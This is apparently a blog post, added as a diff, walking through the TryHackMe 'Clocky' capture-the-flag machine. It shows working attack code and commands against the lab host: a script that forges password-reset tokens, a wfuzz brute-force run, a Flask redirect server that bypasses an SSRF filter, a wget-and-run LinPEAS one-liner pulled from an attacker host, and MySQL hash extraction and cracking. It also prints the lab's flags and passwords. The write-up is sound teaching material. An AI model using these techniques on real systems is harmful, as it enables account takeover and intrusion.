@@ -1,0 +1,464 @@
+---
+slug: "thm-clocky"
+title: "Clocky — TryHackMe Writeup"
+date: "2026-07-22"
+platform: "TryHackMe"
+type: "Machine"
+os: "Linux"
+difficulty: "Medium"
+tags:
+  - "Web"
+  - "Source Code Analysis"
+  - "Token Forgery"
+  - "SSRF"
+  - "SSRF Redirect Bypass"
+  - "MySQL"
+  - "Hashcat"
+  - "Linux"
+  - "Python"
+  - "Flask"
+  - "Werkzeug"
+excerpt: "A medium-rated TryHackMe machine involving source code recovery from an exposed zip archive, predictable password-reset token forgery via SHA-1 timestamp abuse, SSRF filter bypass using an open redirect, MySQL credential extraction, and caching_sha2_password hash cracking to escalate to root."
+readTime: "15 min"
+rating: 3
+url: "https://asbawy.github.io/writeups/thm-clocky"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag } from "@/components/cyber/WriteupComponents";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Port Scanning & robots.txt Discovery",
+      desc: "Nmap revealed SSH (22), Apache (80), Nginx (8000), and a Flask/Werkzeug app (8080). The robots.txt on port 8000 disclosed disallowed file extensions (.sql, .zip, .bak).",
+      tools: ["Nmap", "curl"],
+    },
+    {
+      phase: "Enumeration",
+      title: "Source Code Recovery via index.zip",
+      desc: "Directory fuzzing on port 8000 uncovered index.zip containing the Flask application source (app.py), revealing usernames, routes, and a critically weak password-reset token generation scheme.",
+      tools: ["Feroxbuster", "wget"],
+    },
+    {
+      phase: "Foothold",
+      title: "Predictable Token Forgery & Admin Takeover",
+      desc: "The password reset token was generated from SHA-1(timestamp + username). By recording the server response time and brute-forcing the millisecond component, we forged a valid token to reset the administrator password.",
+      technique: "Predictable Token Forgery (SHA-1 Timestamp Abuse)",
+      tools: ["Burp Suite", "Python", "wfuzz"],
+    },
+    {
+      phase: "Lateral Movement",
+      title: "SSRF Filter Bypass via Open Redirect",
+      desc: "The admin dashboard's location feature was vulnerable to SSRF but blocked direct localhost requests. Bypassed the filter by redirecting through an attacker-controlled Flask server to reach internal services and exfiltrate database.sql.",
+      technique: "SSRF Redirect Bypass",
+      tools: ["Burp Suite", "Flask", "Python"],
+    },
+    {
+      phase: "PrivEsc",
+      title: "MySQL Hash Extraction & Root Escalation",
+      desc: "Recovered SSH credentials from the database, discovered MySQL credentials in a .env file via LinPEAS, extracted caching_sha2_password hashes, cracked the dev user's password with Hashcat, and used it to su to root.",
+      technique: "MySQL Hash Cracking (caching_sha2_password / mode 7401)",
+      tools: ["LinPEAS", "MySQL", "Hashcat"],
+    },
+  ]}
+/>
+
+---
+
+## Introduction
+
+_Clocky_ is a medium-rated TryHackMe machine that exposes multiple web services across four ports. The attack chain begins with source code recovery from a carelessly exposed zip archive, progresses through a predictable password-reset token forgery, exploits a Server-Side Request Forgery (SSRF) vulnerability with a redirect-based filter bypass, and culminates in MySQL credential extraction and hash cracking to achieve root access.
+
+This room contains **six flags** scattered across the attack path, testing enumeration, web exploitation, lateral movement, and privilege escalation skills.
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+A full TCP port scan reveals four listening services:
+
+```bash
+nmap -sC -sV -p- -T4 10.114.156.245 
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 32:f4:f1:ee:40:29:08:34:3f:a2:c7:48:6c:7a:70:29 (RSA)
+|   256 61:b9:2c:6c:ad:1b:9c:59:8d:ff:8d:a1:7c:4d:56:16 (ECDSA)
+|_  256 85:8c:9c:2e:34:b9:3c:3a:8d:a8:e2:c9:5b:a5:a0:e7 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8000/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: 403 Forbidden
+| http-robots.txt: 3 disallowed entries
+|_/*.sql$ /*.zip$ /*.bak$
+8080/tcp open  http    Werkzeug httpd 2.2.3 (Python 3.8.10)
+|_http-server-header: Werkzeug/2.2.3 Python/3.8.10
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+<Callout type="info">
+  Four ports are open. Apache on port 80 and Nginx on port 8000 both return **403 Forbidden**. The
+  Werkzeug/Python server on port 8080 is a Flask application — this will be our primary attack surface.
+  Nmap also detected a `robots.txt` on port 8000 with interesting disallowed extensions.
+</Callout>
+
+---
+
+## Enumeration
+
+### Port 8000 — robots.txt & Hidden Files
+
+The `robots.txt` file on port 8000 reveals file extension restrictions and our first flag:
+
+```bash
+curl 'http://10.114.156.245:8000/robots.txt'
+
+User-agent: *
+Disallow: /*.sql$
+Disallow: /*.zip$
+Disallow: /*.bak$
+```
+
+<SpoilerFlag label="Flag 1" flag="THM{14b45bb9eefdb584b79063eca6a31b7a}" />
+
+<Callout type="warning">
+  The `robots.txt` explicitly disallows indexing of `.sql`, `.zip`, and `.bak` files — a strong
+  indicator that sensitive backup or database files exist on this server.
+</Callout>
+
+### Directory Fuzzing
+
+Using Feroxbuster with the leaked extensions to discover hidden files:
+
+```bash
+feroxbuster -u 'http://10.114.156.245:8000/' \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x zip,sql,bak -t 140 -n
+```
+
+Key finding:
+
+- `http://10.114.156.245:8000/index.zip` — **200 OK** (3,280 bytes)
+
+### Source Code Recovery
+
+Downloading and extracting the archive reveals the Flask application source:
+
+```bash
+wget http://10.114.156.245:8000/index.zip
+unzip index.zip
+```
+
+```text
+Archive: index.zip
+  inflating: app.py
+ extracting: flag2.txt
+```
+
+<SpoilerFlag label="Flag 2" flag="THM{1d3d62de34a3692518d03ec474159eaf}" />
+
+---
+
+## Source Code Analysis
+
+### Key Findings in `app.py`
+
+Reviewing the Flask application source reveals several critical details:
+
+**1. Debug Mode Enabled** — The application runs with `debug=True`, exposing the Werkzeug interactive debugger (potential RCE vector).
+
+**2. Known Usernames** — Three hardcoded users: `jane`, `clarice`, and `administrator`.
+
+**3. Exposed Routes** — `/administrator`, `/forgot_password`, `/password_reset`.
+
+**4. Predictable Password Reset Tokens** — The most critical vulnerability:
+
+```python
+value = datetime.datetime.now()
+lnk = str(value)[:-4] + " . " + username.upper()
+lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
+```
+
+<Callout type="warning">
+  **Critical Vulnerability:** The password reset token is derived from `SHA-1(server_timestamp + username)`.
+  Since the timestamp is predictable (obtained from the HTTP response `Date` header) and the username is
+  known, an attacker can reconstruct the exact token by brute-forcing only the millisecond component
+  (0–99 range after truncation).
+</Callout>
+
+**5. Password Reset Flow:**
+- `POST /forgot_password` — accepts a `username` parameter, generates a token, and stores it in the database.
+- `GET /password_reset?token=<TOKEN>` — validates the token and allows the user to set a new password.
+
+---
+
+## Initial Foothold — Token Forgery
+
+### Step 1: Request a Password Reset
+
+Send a password reset request for the `administrator` account and capture the server's response timestamp from the `Date` header using Burp Suite:
+
+![Burp Suite capturing the password reset request and server timestamp](https://i.imgur.com/RZeYBXI.png)
+
+<Callout type="info">
+  The server's `Date` response header provides the base timestamp. The token generation uses
+  `datetime.datetime.now()` with microsecond precision, but the code truncates the last 4 characters,
+  leaving only 2 significant digits of sub-second precision to brute-force.
+</Callout>
+
+### Step 2: Generate Candidate Tokens
+
+Using the captured timestamp, generate all possible SHA-1 hashes for the 100-value millisecond range:
+
+```python
+import hashlib
+
+def generate_hash(timestamp_ms: str, user: str) -> str:
+    payload = f"{timestamp_ms} . {user.upper()}"
+    return hashlib.sha1(payload.encode("utf-8")).hexdigest()
+
+username = "administrator"
+base_time = "2026-07-22 05:39:35."  # Replace with your captured timestamp
+
+hashes = [
+    generate_hash(f"{base_time}{str(i).zfill(2)}", username)
+    for i in range(100)
+]
+
+with open("hashes.txt", "w") as f:
+    f.write("\n".join(hashes))
+
+print(f"[+] Saved {len(hashes)} candidate hashes to hashes.txt")
+```
+
+<Callout type="info">
+  **Parameter Discovery:** The source code uses `TEMPORARY` as the query parameter name, but testing
+  reveals the actual endpoint accepts `token` as the parameter name. Always verify parameter names
+  against the live application.
+</Callout>
+
+### Step 3: Brute-Force the Valid Token
+
+Using `wfuzz` to identify which candidate hash is the valid token:
+
+```bash
+wfuzz -t 100 -z file,hashes.txt --hs "Invalid token" \
+  'http://10.114.156.245:8080/password_reset?token=FUZZ'
+```
+
+```text
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+000000022:   200        53 L     108 W      1627 Ch     "4bc3340cad35f7094e5d428ef1138c263bd62f79"
+```
+
+### Step 4: Reset Password & Login
+
+Navigate to the password reset URL with the valid token:
+
+```
+http://10.114.156.245:8080/password_reset?token=4bc3340cad35f7094e5d428ef1138c263bd62f79
+```
+
+Set a new password, then log in at `/administrator` with the credentials `administrator:<new_password>`.
+
+<SpoilerFlag label="Flag 3" flag="THM{ee68e42f755f6ebbcd89439432d7b462}" />
+
+![Administrator dashboard showing Flag 3](https://i.imgur.com/geBunES.png)
+
+---
+
+## SSRF — Dashboard Exploitation
+
+### Identifying the SSRF Vector
+
+The admin dashboard contains a "location" input field. After testing for common injection types (command injection, LFI, template injection) with no results, testing for SSRF confirms the application makes outbound HTTP requests:
+
+![SSRF confirmation via HTTP callback](https://i.imgur.com/QITATD9.png)
+
+### SSRF Filter Bypass via Open Redirect
+
+Direct requests to `localhost` or `127.0.0.1` are blocked with an `Action not permitted` error. To bypass this restriction, we use a **redirect-based SSRF bypass**: our attacker-controlled server receives the request and responds with a 301 redirect to the target's localhost.
+
+**Redirect Server (`redi.py`):**
+
+```python
+from flask import Flask, redirect
+
+app = Flask(__name__)
+
+@app.route('/<path:path>')
+def catch_all(path):
+    return redirect(f"http://127.0.0.1/{path}", code=301)
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=9191)
+```
+
+```bash
+python3 redi.py
+```
+
+<Callout type="info">
+  **How this works:** The application's SSRF filter only validates the initial URL (our attacker
+  server). When the server follows the 301 redirect to `http://127.0.0.1/...`, the filter has
+  already been bypassed. This is a classic redirect-based SSRF filter evasion technique.
+</Callout>
+
+![Burp Suite showing successful SSRF via redirect bypass](https://i.imgur.com/Xykri03.png)
+
+### Exfiltrating the Database
+
+From the source code analysis, we know a `database.sql` file exists on the server. Using the SSRF redirect to fetch it:
+
+![database.sql exfiltrated via SSRF containing Flag 4](https://i.imgur.com/idWqqr4.png)
+
+<SpoilerFlag label="Flag 4" flag="THM{350020dc1a53e50e1e92bac2c35dd0a2}" />
+
+The database dump also reveals a plaintext password: `Th1s_1s_4_v3ry_s3cur3_p4ssw0rd`.
+
+---
+
+## SSH Access — Credential Reuse
+
+Testing the recovered password against the three known usernames (`jane`, `clarice`, `administrator`) via SSH reveals it belongs to `clarice`:
+
+```bash
+ssh clarice@10.114.156.245
+# Password: Th1s_1s_4_v3ry_s3cur3_p4ssw0rd
+```
+
+```bash
+clarice@clocky:~$ ls
+app  flag5.txt  snap
+
+clarice@clocky:~$ cat flag5.txt
+```
+
+<SpoilerFlag label="Flag 5" flag="THM{e57dfa35e62d518cfd215dd7729d0877}" />
+
+---
+
+## Privilege Escalation
+
+### Enumeration with LinPEAS
+
+Upload and run LinPEAS for automated enumeration:
+
+```bash
+# On attacker machine
+python3 -m http.server 8888
+
+# On target
+wget http://YOUR_IP:8888/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+```
+
+LinPEAS discovers a `.env` file with MySQL credentials:
+
+```text
+-rw-rw-r-- 1 clarice clarice 20 May 21  2023 /home/clarice/app/.env
+```
+
+```ini
+db=seG3mY4F3tKCJ1Yj
+```
+
+From `app.py`, we know the MySQL username is `clocky_user`.
+
+### MySQL Credential Extraction
+
+```bash
+mysql -u clocky_user -p
+# Password: seG3mY4F3tKCJ1Yj
+```
+
+```sql
+mysql> SELECT Host, User, Authentication_string FROM mysql.user;
+```
+
+```text
++-----------+------------------+------------------------------------------------------+
+| Host      | User             | Authentication_string                                |
++-----------+------------------+------------------------------------------------------+
+| %         | clocky_user      | $A$005$... (caching_sha2_password)                   |
+| localhost | clocky_user      | $A$005$... (caching_sha2_password)                   |
+| localhost | debian-sys-maint | $A$005$... (caching_sha2_password)                   |
+| localhost | dev              | $A$005$... (caching_sha2_password)                   |
+| localhost | root             |                                                      |
++-----------+------------------+------------------------------------------------------+
+```
+
+<Callout type="warning">
+  **Hash Format Issue:** MySQL 8.0+ uses `caching_sha2_password` by default. These hashes are **not
+  directly compatible** with Hashcat. They must be converted to a specific format before cracking.
+</Callout>
+
+### Converting Hashes for Hashcat
+
+MySQL's `caching_sha2_password` hashes require a format conversion documented on the [Hashcat example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes) for mode **7401**:
+
+```sql
+SELECT user,
+  CONCAT('$mysql', SUBSTR(authentication_string,1,3),
+    LPAD(CONV(SUBSTR(authentication_string,4,3),16,10),4,0), '*',
+    INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*'))
+  AS hash
+FROM mysql.user
+WHERE plugin = 'caching_sha2_password'
+  AND authentication_string NOT LIKE '%INVALIDSALTANDPASSWORD%';
+```
+
+This produces hashes in the correct `$mysql$A$0005*salt*hash` format.
+
+### Cracking with Hashcat
+
+```bash
+hashcat -m 7401 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+The `dev` user's password cracks to: **`armadillo`**
+
+### Root Access
+
+The cracked password works for `su root`:
+
+```bash
+clarice@clocky:~$ su root
+Password: armadillo
+
+root@clocky:~# cat /root/flag6.txt
+```
+
+<SpoilerFlag label="Flag 6 (Root)" flag="THM{6ad86ac1463ea8afbe0edd6cdd708f36}" />
+
+---
+
+## Summary
+
+Clocky demonstrates a realistic attack chain where multiple small vulnerabilities compound into full system compromise:
+
+1. **Information Disclosure** — A `robots.txt` file hinted at hidden file types, leading to source code recovery from an exposed `index.zip`.
+2. **Predictable Token Forgery** — Password reset tokens generated from `SHA-1(timestamp + username)` allowed brute-forcing with only 100 candidates.
+3. **SSRF with Filter Bypass** — A redirect-based bypass evaded localhost restrictions, enabling internal service enumeration and database exfiltration.
+4. **Credential Reuse** — A password from the database dump granted SSH access as `clarice`.
+5. **MySQL Hash Cracking** — Extracting and cracking `caching_sha2_password` hashes revealed the root password.
+
+---
+
+## References
+
+- [OWASP — Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
+- [OWASP — Insufficient Entropy / Predictable Tokens](https://owasp.org/www-community/vulnerabilities/Insufficient_Entropy)
+- [PortSwigger — SSRF with Filter Bypass via Open Redirection](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses)
+- [Hashcat — Example Hashes (mode 7401: MySQL caching_sha2_password)](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [HackTricks — SSRF Bypass Techniques](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
+- [Linux Privilege Escalation: Enumeration & Recon](/cheatsheet/linux/privesc-enumeration)
+- [Linux Privilege Escalation: Basics & Exploitation](/cheatsheet/linux/privesc-exploitation)
